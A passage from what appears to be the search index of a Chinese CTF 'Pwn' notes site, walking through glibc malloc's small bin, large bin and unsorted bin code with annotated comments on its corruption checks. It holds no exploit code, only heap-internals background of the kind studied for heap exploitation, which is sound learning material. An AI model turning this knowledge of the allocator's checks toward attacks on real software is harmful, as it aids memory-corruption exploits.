bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if (( victim = last ( bin )) != bin ) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if ( victim == 0 ) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate ( av ); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk ( av , victim , nb ); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } }","title":"small bin"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_16","text":"malloc \u53c2\u6570\u662f\u65e0\u7b26\u53f7\u957f\u6574\u578b smallbin \u662f\u4ece\u6700\u540e\u7ed3\u70b9\uff08\u6700\u5148\u8fdb\u5165\uff09\u5f00\u59cb\u53d6 chunk \uff0c\u7b26\u5408\u201c\u5148\u8fdb\u5148\u51fa\u201d","title":"\u5c0f\u603b\u7ed3"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#small-bin-malloc","text":"\u6b65\u9aa4\u5982\u4e0b\uff1a bck = victim->bk; | (bck->fd != victim) \uff1a\u68c0\u67e5\u5373\u5c06\u5206\u914d\u7684\u7684 victim \u7684\u4e0a\u4e00\u4e2a chunk \u7684 fd \u6307\u9488\u662f\u5426\u6307\u5411 victim \u9632\u6b62\u4f2a\u9020 set_inuse_bit_at_offset(victim, nb); \uff1a\u4fee\u6539 victim \u7684 size inuse \u4f4d bin->bk = bck; | bck->fd = bin; \uff1a\u4fee\u6539\u94fe\u8868\u5c06 victime \u53d6\u51fa\u6765\uff08small bin \u6700\u540e\u4e00\u4e2a\uff09","title":"small bin malloc \u68c0\u67e5\u673a\u5236"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#large-bin_1","text":"\u5f53 fast bin\u3001small bin \u4e2d\u7684 chunk \u90fd\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42 chunk \u5927\u5c0f\u65f6\uff0c\u5c31\u4f1a\u8003\u8651\u662f\u4e0d\u662f large bin\u3002\u4f46\u662f\uff0c\u5176\u5b9e\u5728 large bin \u4e2d\u5e76\u6ca1\u6709\u76f4\u63a5\u53bb\u626b\u63cf\u5bf9\u5e94 bin \u4e2d\u7684 chunk\uff0c\u800c\u662f**\u5148\u5229\u7528 malloc_consolidate\uff08\u53c2\u89c1 malloc_state \u76f8\u5173\u51fd\u6570\uff09 \u51fd\u6570\u5904\u7406 fast bin \u4e2d\u7684 chunk\uff0c\u5c06\u6709\u53ef\u80fd\u80fd\u591f\u5408\u5e76\u7684 chunk \u5148\u8fdb\u884c\u5408\u5e76\u540e\u653e\u5230 unsorted bin \u4e2d\uff0c\u4e0d\u80fd\u591f\u5408\u5e76\u7684\u5c31\u76f4\u63a5\u653e\u5230 unsorted bin \u4e2d**\uff0c\u7136\u540e\u518d\u5728\u4e0b\u9762\u7684\u5927\u5faa\u73af\u4e2d\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002 \u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u4ece\u76f8\u5e94\u7684 bin \u4e2d\u53d6\u51fa large chunk \u5462\uff1f\u8fd9\u662f ptmalloc \u7684\u673a\u5236\uff0c\u5b83\u4f1a\u5728\u5206\u914d large chunk \u4e4b\u524d\u5bf9\u5806\u4e2d\u788e\u7247 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u4fbf\u51cf\u5c11\u5806\u4e2d\u7684\u788e\u7247\u3002 /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else { // \u83b7\u53d6large bin\u7684\u4e0b\u6807\u3002 idx = largebin_index ( nb ); // \u5982\u679c\u5b58\u5728fastbin\u7684\u8bdd\uff0c\u4f1a\u5904\u7406 fastbin if ( have_fastchunks ( av )) malloc_consolidate ( av ); }","title":"large bin"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#-unsorted-bin","text":"2020.07.08 largebin \u5206\u914d\u673a\u5236\u4e0d\u592a\u660e\u767d \u5982\u679c\u7a0b\u5e8f\u6267\u884c\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u4e48\u8bf4\u660e \u4e0e chunk \u5927\u5c0f\u6b63\u597d\u4e00\u81f4\u7684 bin (fast bin\uff0c small bin) \u4e2d\u6ca1\u6709 chunk \u53ef\u4ee5\u76f4\u63a5\u6ee1\u8db3\u9700\u6c42 \uff0c\u4f46\u662f large chunk \u5219\u662f\u5728\u8fd9\u4e2a\u5927\u5faa\u73af\u4e2d\u5904\u7406 \u3002 \u5728\u63a5\u4e0b\u6765\u7684\u8fd9\u4e2a\u5faa\u73af\u4e2d\uff0c\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u7684\u64cd\u4f5c \u6309\u7167 FIFO \u7684\u65b9\u5f0f\u9010\u4e2a\u5c06 unsorted bin \u4e2d\u7684 chunk \u53d6\u51fa\u6765 \u5982\u679c\u662f small request\uff0c\u5219\u8003\u8651\u662f\u4e0d\u662f\u6070\u597d\u6ee1\u8db3\uff0c\u662f\u7684\u8bdd\uff0c\u76f4\u63a5\u8fd4\u56de\u3002 \u5982\u679c\u4e0d\u662f\u7684\u8bdd\uff0c\u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002 \u5c1d\u8bd5\u4ece large bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58 \u8be5\u90e8\u5206\u662f\u4e00\u4e2a\u5927\u5faa\u73af\uff0c\u8fd9\u662f\u4e3a\u4e86\u5c1d\u8bd5\u91cd\u65b0\u5206\u914d small bin chunk\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u867d\u7136\u4f1a\u9996\u5148\u4f7f\u7528 large bin\uff0ctop chunk \u6765\u5c1d\u8bd5\u6ee1\u8db3\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u6ee1\u8db3\u7684\u8bdd\uff0c\u7531\u4e8e\u6211\u4eec\u5728\u4e0a\u9762\u6ca1\u6709\u5206\u914d\u6210\u529f small bin\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u5bf9 fast bin \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f1a\u8fdb\u884c fast bin chunk \u7684\u5408\u5e76\uff0c\u8fdb\u800c\u4f7f\u7528\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u5c1d\u8bd5\u518d\u6b21\u5206\u914d small bin chunk\u3002 /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a \"small\" request. */ for (;;) { int iters = 0 ;","title":"\u5927\u5faa\u73af - \u904d\u5386 unsorted bin"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#unsorted-bin_1","text":"\u5148\u8003\u8651 unsorted bin\uff0c\u518d\u8003\u8651 last remainder \uff0c\u4f46\u662f\u5bf9\u4e8e small bin chunk \u7684\u8bf7\u6c42\u4f1a\u6709\u6240\u4f8b\u5916\u3002 \u6ce8\u610f unsorted bin \u7684\u904d\u5386\u987a\u5e8f\u4e3a bk\u3002 // \u5982\u679c unsorted bin \u4e0d\u4e3a\u7a7a // First In First Out while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { // victim \u4e3a unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk // bck \u4e3a unsorted bin \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a chunk bck = victim -> bk ; // \u5224\u65ad\u5f97\u5230\u7684 chunk \u662f\u5426\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u80fd\u8fc7\u5c0f\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u5927 // \u4e00\u822c system_mem \u7684\u5927\u5c0f\u4e3a132K if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); // \u5f97\u5230victim\u5bf9\u5e94\u7684chunk\u5927\u5c0f\u3002 size = chunksize ( victim );","title":"unsorted bin \u904d\u5386"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#small-request","text":"\u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42\u4e3a small bin chunk \uff0c\u90a3\u4e48\u6211\u4eec\u9996\u5148\u8003\u8651 last remainder\uff0c\u5982\u679c last remainder \u662f unsorted bin \u4e2d\u7684\u552f\u4e00\u4e00\u5757\u7684\u8bdd\uff0c \u5e76\u4e14 last remainder \u7684\u5927\u5c0f\u5206\u5272\u540e\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a chunk \uff0c \u4e3a\u4ec0\u4e48\u6ca1\u6709\u7b49\u53f7 \uff1f /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ //\u662f\u5426\u662fsmallbin\u8303\u56f4\uff1bbck\u662f\u5426\u662f\u94fe\u9996\uff1bremainder\u662f\uff08\u5206\u914d\u5b8c\uff09\u5269\u4f59\u90e8\u5206 if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { /* split and reattach remainder */ // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u5927\u5c0f remainder_size = size - nb ; // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u4f4d\u7f6e remainder = chunk_at_offset ( victim , nb ); // \u66f4\u65b0 unsorted bin \u7684\u60c5\u51b5 // av\u662f\u88ab\u53d6\u51fachunk\u7684\u4e0b\u4e00\u4e2achunk\uff08fd\uff09 unsorted_chunks ( av ) -> bk = unsorted_chunks ( av ) -> fd = remainder ; // \u66f4\u65b0 av \u4e2d\u8bb0\u5f55\u7684 last_remainder av -> last_remainder = remainder ; // \u66f4\u65b0last remainder\u7684\u6307\u9488 remainder -> bk = remainder -> fd = unsorted_chunks ( av ); if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6evictim\u7684\u5934\u90e8\uff0cinuse set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6e remainder \u7684\u5934\u90e8 set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6e\u8bb0\u5f55 remainder \u5927\u5c0f\u7684 prev_size \u5b57\u6bb5\uff0c\u56e0\u4e3a\u6b64\u65f6 remainder \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u3002 set_foot ( remainder , remainder_size ); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk ( av , victim , nb ); // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; }","title":"SMALL REQUEST"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_17","text":"/* remove from unsorted list */ //\u4fee\u6539 unsortedchunk \u94fe\u8868 unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av );","title":"\u521d\u59cb\u53d6\u51fa"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#chunk-exact-fit","text":"\u5982\u679c\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u6b63\u597d\u5408\u9002\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u91cc\u5e94\u8be5\u5df2\u7ecf\u628a\u5408\u5e76\u540e\u6070\u597d\u5408\u9002\u7684 chunk \u7ed9\u5206\u914d\u51fa\u53bb\u4e86\u3002 /* Take now instead of binning if exact fit */ if ( size == nb ) { //\u5927\u5c0f\u6b63\u597d\u5408\u9002 set_inuse_bit_at_offset ( victim , size ); // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk ( av , victim , nb ); // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); //\u76f4\u63a5\u8fd4\u56de chunk \u6307\u9488 return p ; }","title":"\u53d6\u51fa chunk \u5927\u5c0f\u521a\u597d\u5408\u9002 \uff08EXACT FIT\uff09"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#chunk-smallbin-place-chunk-in-small-bin","text":"\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 small bin \u4e2d\u3002 /* place chunk in bin */ //\u5224\u65ad size \u662f\u5426\u5728smallbin if ( in_smallbin_range ( size )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 victim_index = smallbin_index ( size ); // \u8c03\u6574 small bin \u7684\u94fe\u8868 bck = bin_at ( av , victim_index ); fwd = bck -> fd ;","title":"\u5c06\u53d6\u51fa\u6765 chunk \u653e\u5165\u5230 smallbin \uff08PLACE CHUNK IN SMALL BIN\uff09"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#place-chunk-in-large-bin","text":"\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 large bin \u4e2d\u3002 \u8fd9\u91cc\u5e94\u8be5\u662f\u83b7\u53d6\u6b63\u786e\u63d2\u5165\u4f4d\u7f6e\u7684\u6307\u9488 bck\u3001fwd\u3002\u6700\u540e\u63d2\u5165\u5f62\u5f0f\u4e3a\uff1abck\u2194victim\u2194fwd\u3002 \u94fe\u8868\u6784\u5efa\u5728\uff1a \u6700\u7ec8\u53d6\u51fa } else { // large bin \u8303\u56f4 victim_index = largebin_index ( size ); bck = bin_at ( av , victim_index ); // \u5f53\u524d large bin \u7684\u5934\u90e8 fwd = bck -> fd ; /* maintain large bins in sorted order */ /* \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0clargebin \u4ee5 fd_nextsize \u9012\u51cf\u6392\u5e8f\u3002 \u540c\u6837\u5927\u5c0f\u7684 chunk\uff0c\u540e\u6765\u7684\u53ea\u4f1a\u63d2\u5165\u5230\u4e4b\u524d\u540c\u6837\u5927\u5c0f\u7684 chunk \u540e\uff0c \u800c\u4e0d\u4f1a\u4fee\u6539\u4e4b\u524d\u76f8\u540c\u5927\u5c0f\u7684fd/bk_nextsize\uff0c\u8fd9\u4e5f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c \u53ef\u4ee5\u51cf\u4f4e\u5f00\u9500\u3002\u6b64\u5916\uff0cbin \u5934\u4e0d\u53c2\u4e0e nextsize \u94fe\u63a5\u3002*/ // \u5982\u679c large bin \u94fe\u8868\u4e0d\u7a7a if ( fwd != bck ) { /* Or with inuse bit to speed comparisons */ // \u52a0\u901f\u6bd4\u8f83\uff0c\u5e94\u8be5\u4e0d\u4ec5\u4ec5\u6709\u8fd9\u4e2a\u8003\u8651\uff0c\u56e0\u4e3a\u94fe\u8868\u91cc\u7684 chunk \u90fd\u4f1a\u8bbe\u7f6e\u8be5\u4f4d\u3002 size |= PREV_INUSE ; /* if smaller than smallest, bypass loop below */ // bck->bk \u5b58\u50a8\u7740\u76f8\u5e94 large bin \u4e2d\u6700\u5c0f\u7684chunk\u3002 // \u5982\u679c\u904d\u5386\u7684 chunk \u6bd4\u5f53\u524d\u6700\u5c0f\u7684\u8fd8\u8981\u5c0f\uff0c\u90a3\u5c31\u53ea\u9700\u8981\u63d2\u5165\u5230\u94fe\u8868\u5c3e\u90e8\u3002 // \u5224\u65ad bck->bk \u662f\u4e0d\u662f\u5728 main arena\u3002 assert ( chunk_main_arena ( bck -> bk )); if (( unsigned long ) ( size ) < ( unsigned long ) chunksize_nomask ( bck -> bk )) { // \u4ee4 fwd \u6307\u5411 large bin \u5934 fwd = bck ; // \u4ee4 bck \u6307\u5411 largin bin \u5c3e\u90e8 chunk bck = bck -> bk ; // victim \u7684 fd_nextsize \u6307\u5411 largin bin \u7684\u7b2c\u4e00\u4e2a chunk victim -> fd_nextsize = fwd -> fd ; // victim \u7684 bk_nextsize \u6307\u5411\u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u6307\u5411\u7684 bk_nextsize victim -> bk_nextsize = fwd -> fd -> bk_nextsize ; // \u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u7684 bk_nextsize \u6307\u5411 victim // \u539f\u6765\u6307\u5411\u94fe\u8868\u7b2c\u4e00\u4e2a chunk \u7684 fd_nextsize \u6307\u5411 victim fwd -> fd -> bk_nextsize = victim -> bk_nextsize -> fd_nextsize = victim ; } else { // \u5f53\u524d\u8981\u63d2\u5165\u7684 victim \u7684\u5927\u5c0f\u5927\u4e8e\u6700\u5c0f\u7684 chunk // \u5224\u65ad fwd \u662f\u5426\u5728 main arena assert ( chunk_main_arena ( fwd )); // \u4ece\u94fe\u8868\u5934\u90e8\u5f00\u59cb\u627e\u5230\u4e0d\u6bd4 victim \u5927\u7684 chunk while (( unsigned long ) size < chunksize_nomask ( fwd )) { fwd = fwd -> fd_nextsize ; assert ( chunk_main_arena ( fwd )); } // \u5982\u679c\u627e\u5230\u4e86\u4e00\u4e2a\u548c victim \u4e00\u6837\u5927\u7684 chunk\uff0c // \u90a3\u5c31\u76f4\u63a5\u5c06 chunk \u63d2\u5165\u5230\u8be5chunk\u7684\u540e\u9762\uff0c\u5e76\u4e0d\u4fee\u6539 nextsize \u6307\u9488\u3002 if (( unsigned long ) size == ( unsigned long ) chunksize_nomask ( fwd )) /* Always insert in the second position. */ fwd = fwd -> fd ; else { // \u5982\u679c\u627e\u5230\u7684chunk\u548c\u5f53\u524dvictim\u5927\u5c0f\u4e0d\u4e00\u6837 // \u90a3\u4e48\u5c31\u9700\u8981\u6784\u9020 nextsize \u53cc\u5411\u94fe\u8868\u4e86 victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; } bck = fwd -> bk ; } } else // \u5982\u679c\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u7b80\u5355\u4f7f\u5f97 fd_nextsize \u4e0e bk_nextsize \u6784\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u5373\u53ef\u3002 victim -> fd_nextsize = victim -> bk_nextsize = victim ; }","title":"PLACE CHUNK IN LARGE BIN"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_18","text":"// \u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\uff0c\u6784\u6210 bck<-->victim<-->fwd\u3002 mark_bin ( av , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ;","title":"\u6700\u7ec8\u53d6\u51fa"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#while","text":"while \u6700\u591a\u8fed\u4ee3 10000 \u6b21\u540e\u9000\u51fa\u3002 // #define MAX_ITERS 10000 if ( ++ iters >= MAX_ITERS ) break ; }","title":"WHILE \u8fed\u4ee3\u6b21\u6570"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#large-chunk","text":"\u6ce8\uff1a \u6216\u8bb8\u4f1a\u5f88\u5947\u602a\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6ca1\u6709\u5148\u53bb\u770b small chunk \u662f\u5426\u6ee1\u8db3\u65b0\u9700\u6c42\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a small bin \u5728\u5faa\u73af\u4e4b\u524d\u5df2\u7ecf\u5224\u65ad\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u662f\u5408\u5e76\u540e\u7684\u624d\u51fa\u73b0 chunk\u3002\u4f46\u662f\u5728\u5927\u5faa\u73af\u5916\uff0clarge chunk \u53ea\u662f\u5355\u7eaf\u5730\u627e\u5230\u5176\u7d22\u5f15\uff0c\u6240\u4ee5\u89c9\u5f97\u5728\u8fd9\u91cc\u76f4\u63a5\u5148\u5224\u65ad\u662f\u5408\u7406\u7684\uff0c\u800c\u4e14\u4e5f\u4e3a\u4e86\u4e0b\u9762\u53ef\u4ee5\u518d\u53bb\u627e\u8f83\u5927\u7684 chunk\u3002 \u5982\u679c\u8bf7\u6c42\u7684 chunk \u5728 large chunk \u8303\u56f4\u5185\uff0c\u5c31\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u626b\u63cf\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u5408\u9002\u7684\u3002 /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ //\u5224\u65ad\u662f\u5426smallbin if ( ! in_smallbin_range ( nb )) { bin = bin_at ( av , idx ); /* skip scan if empty or largest chunk is too small */ // \u5982\u679c\u5bf9\u5e94\u7684 bin \u4e3a\u7a7a\u6216\u8005\u5176\u4e2d\u7684chunk\u6700\u5927\u7684\u4e5f\u5f88\u5c0f\uff0c\u90a3\u5c31\u8df3\u8fc7 // first(bin)=bin->fd \u8868\u793a\u5f53\u524d\u94fe\u8868\u4e2d\u6700\u5927\u7684chunk if (( victim = first ( bin )) != bin && ( unsigned long ) chunksize_nomask ( victim ) >= ( unsigned long ) ( nb )) { // \u53cd\u5411\u904d\u5386\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5c0f\u4e8e\u6240\u9700chunk\u5927\u5c0f\u7684chunk victim = victim -> bk_nextsize ; while ((( unsigned long ) ( size = chunksize ( victim )) < ( unsigned long ) ( nb ))) victim = victim -> bk_nextsize ; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ // \u5982\u679c\u6700\u7ec8\u53d6\u5230\u7684chunk\u4e0d\u662f\u8be5bin\u4e2d\u7684\u6700\u540e\u4e00\u4e2achunk\uff0c\u5e76\u4e14\u8be5chunk\u4e0e\u5176\u524d\u9762\u7684chunk // \u7684\u5927\u5c0f\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53d6\u5176\u524d\u9762\u7684chunk\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u8c03\u6574bk_nextsize,fd_nextsize // \u94fe\u8868\u3002\u56e0\u4e3a\u5927\u5c0f\u76f8\u540c\u7684chunk\u53ea\u6709\u4e00\u4e2a\u4f1a\u88ab\u4e32\u5728nextsize\u94fe\u4e0a\u3002 if ( victim != last ( bin ) && chunksize_nomask ( victim ) == chunksize_nomask ( victim -> fd )) victim = victim -> fd ; // \u8ba1\u7b97\u5206\u914d\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb ; // \u8fdb\u884cunlink\uff08\u5b8f\u64cd\u4f5c\uff09 unlink ( av , victim , bck , fwd ); /* Exhaust */ // \u5269\u4e0b\u7684\u5927\u5c0f\u4e0d\u8db3\u4ee5\u5f53\u505a\u4e00\u4e2a\u5757 // \u5f88\u597d\u5947\u63a5\u4e0b\u6765\u4f1a\u600e\u4e48\u529e\uff1f if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // \u5269\u4e0b\u7684\u5927\u5c0f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2achunk\uff0c\u8fdb\u884c\u5206\u5272\u3002 else { // \u83b7\u53d6\u5269\u4e0b\u90a3\u90e8\u5206chunk\u7684\u6307\u9488\uff0c\u79f0\u4e3aremainder remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u63d2\u5165unsorted bin\u4e2d bck = unsorted_chunks ( av ); fwd = bck -> fd ; // \u5224\u65ad unsorted bin \u662f\u5426\u88ab\u7834\u574f\u3002 if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; // \u5982\u679c\u4e0d\u5904\u4e8esmall bin\u8303\u56f4\u5185\uff0c\u5c31\u8bbe\u7f6e\u5bf9\u5e94\u7684\u5b57\u6bb5 if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6e\u5206\u914d\u7684chunk\u7684\u6807\u8bb0 set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6eremainder\u7684\u4e0a\u4e00\u4e2achunk\uff0c\u5373\u5206\u914d\u51fa\u53bb\u7684chunk\u7684\u4f7f\u7528\u72b6\u6001 // \u5176\u4f59\u7684\u4e0d\u7528\u7ba1\uff0c\u76f4\u63a5\u4ece\u4e0a\u9762\u7ee7\u627f\u4e0b\u6765\u4e86 set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot ( remainder , remainder_size ); } // \u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // \u8f6c\u6362\u4e3amem\u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } }","title":"large 